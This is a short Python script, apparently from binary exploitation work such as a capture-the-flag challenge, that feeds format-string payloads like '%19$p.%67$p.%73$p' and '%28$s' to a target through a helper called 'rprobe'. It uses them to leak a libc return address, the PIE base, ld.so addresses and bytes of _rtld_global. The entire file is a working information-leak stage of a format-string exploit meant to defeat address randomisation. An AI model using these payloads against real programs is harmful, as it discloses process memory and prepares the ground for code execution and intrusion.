import re,sys
from rprobe import run
tests=[
 ('libc_ret+pie+ldso', r'%19$p.%67$p.%73$p', 'B'),
 ('_rtld_global[0:8]=ns_loaded (as %p)', r'%28$p', 'B'),
 ('leak bytes @_rtld_global via %s', r'%28$s', 'B'),
 ('leak bytes @ldso+375f0 via %s', r'%42$s', 'B'),
 ('argv0 string', r'%6$s', 'B'),
]
for name,f1,f2 in tests:
    try:
        lk,out=run('1',f1,f2)
        print('%-38s f1=%-22s out=%r'%(name,f1,out[:120]))
    except Exception as e:
        print(name,'ERR',e)
